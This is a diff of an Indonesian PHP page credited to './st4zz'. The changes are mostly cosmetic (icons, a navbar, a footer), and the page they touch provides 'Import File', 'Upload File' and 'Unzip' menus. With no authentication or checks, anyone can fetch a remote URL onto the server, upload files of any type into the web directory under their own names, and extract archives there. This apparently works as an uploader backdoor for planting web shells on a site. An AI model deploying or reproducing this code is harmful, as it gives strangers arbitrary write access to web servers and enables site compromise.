@@ -1,6 +1,7 @@
-<!DOCTYPE html>
+<!doctype html>
+<html lang="en">
   <head>
-  <!-- Required meta tags -->
+  <!-- st4zz Project -->
   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -29,21 +30,45 @@ body {
 	font-family: Ubuntu;
 }
 
+nav { 	font-family: Lobster;
+text-decoration: none;
+}
+
 .import label {
 	font-family: Josefin Sans;
 }
 .import h2 {
 	font-family: Lobster;
+text-decoration: underline;
 }
 .upload h2 {
 	font-family: Lobster;
+text-decoration: underline;
 }
 .unzip h2 {
 	font-family: Lobster;
+text-decoration: underline;
+}
+
+footer a {
+color:#fff;
+text-shadow: 1px 1px 10px #ff0000;
 }
 </style>
   </head>
 <body>
+<nav class="navbar top navbar-expand-lg navbar-dark bg-secondary">
+<div class="container">
+<a class="navbar-brand" href="#"><i class="fas fa-home"></i> XProject</a>
+<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button>
+<div class="collapse navbar-collapse" id="navbarNav"><ul class="navbar-nav">
+<li class="nav-item"><a class="nav-link" href="#import"><i class="fas fa-link"></i> Import File</a></li>
+<li class="nav-item"><a class="nav-link" href="#upload"><i class="fas fa-upload"></i> Upload File</a></li>
+<li class="nav-item"><a class="nav-link" href="#unzip"><i class="fas fa-file-archive"></i> Unzip File</a></li>
+</ul>
+</div>
+</div>
+</nav>
 <?php
 if($_POST['act'] == 'Mulai Import File' &&$_POST['url'] != '')
 {$url=$_POST['url']; $nama=$_POST['nama'];
@@ -54,16 +79,16 @@ if($nama == '')
 else{$file=$nama;}
 // File berhasil di import.
 if(copy($url,$file))
-{echo '<div class="alert alert-success text-center" role="alert"><i class="fal fa-check-circle"></i> File berhasil diimport dan disimpan sebagai “<u><a title="Visit Link" href="./'.$file;
+{echo '<div class="alert alert-success text-center" role="alert"><i class="fas fa-check-circle"></i> File berhasil diimport dan disimpan sebagai “<u><a title="Visit Link" href="./'.$file;
 {echo '"><b><i class="far fa-external-link-square"></i> '.$file;
 {echo '</b></a></u>”</div>';}}}
 // File gagal di import.
-else {echo '<div class="alert alert-danger text-center" role="alert"><i class="far fa-exclamation-circle"></i> Gagal mengimport file <b>'.basename($url).'';} echo '</b></div>';}
+else {echo '<div class="alert alert-danger text-center" role="alert"><i class="fas fa-exclamation-triangle"></i> Gagal mengimport file <b>'.basename($url).'';} echo '</b></div>';}
 echo '<section id="import" class="import mb-4">
 <div class="container">
-<div class="row mb-3 pt-2">
+<div class="row mb-4 pt-2">
 <div class="col text-center">
-<h2>Import File Menu</h2>
+<h2><i class="fas fa-link"></i> Import File Menu</h2>
 </div>
 </div>';
 echo '<div class="row justify-content-center">
@@ -88,8 +113,7 @@ echo '<div class="row justify-content-center">
 echo '<section id="upload" class="upload mb-4">
 <div class="container">
 <div class="row mb-3 pt-2">
-<div class="col text-center">
-<h2>Upload File Menu</h2>
+<div class="col text-center"><h2><i class="fas fa-upload"></i> Upload File Menu</h2>
 </div>
 </div>';
 echo '<div class="row justify-content-center">
@@ -103,8 +127,8 @@ echo '<div class="row justify-content-center">
 </div>
 </section>';
 if( $_POST['_upl'] == "Mulai Upload File" ) {
-if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<div class="alert alert-success text-center" role="alert">File “<u><b><a title="Visit Link" href="./'.$_FILES['file']['name'].'">'.$_FILES['file']['name'].'</a></b></u>” berhasil diupload...!!!</div><br/>'; }
-else { echo '<div class="alert alert-danger text-center" role="alert">File gagal diupload...!!!</div><br/>'; }
+if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<div class="alert alert-success text-center" role="alert"><i class="fas fa-check-circle"></i> File “<u><b><a title="Visit Link" href="./'.$_FILES['file']['name'].'">'.$_FILES['file']['name'].'</a></b></u>” berhasil diupload...!!!</div><br/>'; }
+else { echo '<div class="alert alert-danger text-center" role="alert"><i class="fas fa-exclamation-triangle"></i> File gagal diupload...!!!</div><br/>'; }
 }
 ?>
 <hr/>
@@ -139,10 +163,10 @@ class Unzipper {
       closedir($dh);
 
       if(!empty($this->zipfiles)) {
-        self::$status = '<div class="alert alert-primary text-center" role="alert"><b>File .ZIP atau .GZ berhasil ditemukan, silahkan pilih untuk di ekstrak.</b></div>';
+        self::$status = '<div class="alert alert-primary text-center" role="alert"><b><i class="fas fa-thumbs-up"></i> File .ZIP atau .GZ berhasil ditemukan, silahkan pilih file untuk di ekstrak.</b></div>';
       }
       else {
-        self::$status = '<div class="alert alert-danger text-center" role="alert"><b>Tidak dapat menemukan file .ZIP atau .GZ didalam folder ini.</b></div>';
+        self::$status = '<div class="alert alert-danger text-center" role="alert"><b><i class="fas fa-exclamation-circle"></i> Tidak dapat menemukan file .ZIP atau .GZ didalam folder ini.</b></div>';
       }
     }
 
@@ -176,7 +200,7 @@ class Unzipper {
   public static function extractZipArchive($archive, $destination) {
     // Check if webserver supports unzipping.
     if(!class_exists('ZipArchive')) {
-      self::$status = '<div class="alert alert-danger text-center" role="alert">Your PHP version does not support unzip functionality.</div>';
+      self::$status = '<div class="alert alert-danger text-center" role="alert"><i class="fas fa-exclamation-circle"></i> Your PHP version does not support unzip functionality.</div>';
       return;
     }
 
@@ -188,21 +212,21 @@ class Unzipper {
       if(is_writeable($destination . '/')) {
         $zip->extractTo($destination);
         $zip->close();
-        self::$status = '<div class="alert alert-success text-center" role="alert"><b>File berhasil di ekstrak :)</b></div>';
+        self::$status = '<div class="alert alert-success text-center" role="alert"><b><i class="fas fa-check-circle"></i> File berhasil di ekstrak :)</b></div>';
       }
       else {
-        self::$status = '<div class="alert alert-danger text-center" role="alert">Directory not writeable by webserver.</div>';
+        self::$status = '<div class="alert alert-danger text-center" role="alert"><i class="fas fa-exclamation-circle"></i> Directory not writeable by webserver.</div>';
       }
     }
     else {
-      self::$status = '<div class="alert alert-danger text-center" role="alert">Tidak dapat membaca file ZIP atau GZ.</div>';
+      self::$status = '<div class="alert alert-danger text-center" role="alert"><i class="fas fa-exclamation-circle"></i> Tidak dapat membaca file ZIP atau GZ.</div>';
     }
   }
 
   public static function extractGzipFile($archive, $destination) {
     // Check if zlib is enabled
     if(!function_exists('gzopen')) {
-      self::$status = '<div class="alert alert-danger text-center" role="alert">Your PHP has no zlib support enabled.</div>';
+      self::$status = '<div class="alert alert-danger text-center" role="alert"><i class="fas fa-exclamation-circle"></i> Your PHP has no zlib support enabled.</div>';
       return;
     }
 
@@ -218,10 +242,10 @@ class Unzipper {
 
     // Check if file was extracted.
     if(file_exists($destination . '/' . $filename)) {
-      self::$status = '<div class="alert alert-success text-center" role="alert"><b>File berhasil di ekstrak :)</b></div>';
+      self::$status = '<div class="alert alert-success text-center" role="alert"><b><i class="fas fa-check-circle"></i> File berhasil di ekstrak :)</b></div>';
     }
     else {
-      self::$status = '<div class="alert alert-danger text-center" role="alert"><b>Error mengekstrak file!</b></div>';
+      self::$status = '<div class="alert alert-danger text-center" role="alert"><b><i class="fas fa-exclamation-triangle"></i> Error mengekstrak file, mungkin file corrupt atau memiliki sandi!</b></div>';
     }
   }
 }
@@ -230,7 +254,7 @@ class Unzipper {
 <div class="container">
 <div class="row mb-3 pt-2">
 <div class="col text-center">
-<h2>Unzip File Menu</h2>
+<h2><i class="fas fa-file-archive"></i> Unzip File Menu</h2>
 </div>
 </div>
 <div class="row justify-content-center">
@@ -251,7 +275,17 @@ class Unzipper {
 </div>
 </div>
 </section>
-<hr/>
-<table width="100%"><tr><td style="text-align:left;"><a href="." title="Back to directory">« Back to Directory</a></td><td style="text-align:right;">Script coded by <a title="st4zz Blog" href="http://blog.st4zz.io" target="_blank">./st4zz</a></td></tr></table>
+<footer class="bg-secondary mt-5 text-white">
+<div class="container">
+<div class="row pt-2 pb-2">
+<div class="col">
+<table width="100%"><tr><td style="text-align:left;"><button type="button" class="btn btn-primary"><a href="." title="Back to directory"><i class="fas fa-folder"></i> Back to Directory</a></button></td><td style="text-align:right;" class="btn btn-dark"><i class="fab fa-github"></i> Coded by ./st4zz</td></tr></table>
+</div>
+</div>
+</div>
+</footer>
+<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js" integrity="sha384-wHAiFfRlMFy6i5SRaxvfOCifBUQy1xHdJ/yoi7FRNXMRBu5WHdZYu1hA6ZOblgut" crossorigin="anonymous"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js" integrity="sha384-B0UglyR+jN6CkvvICOB2joaf5I4l3gm9GU6Hc1og6Ls7i6U/mkkaduKaBhlAXv9k" crossorigin="anonymous"></script>
 </body>
 </html>
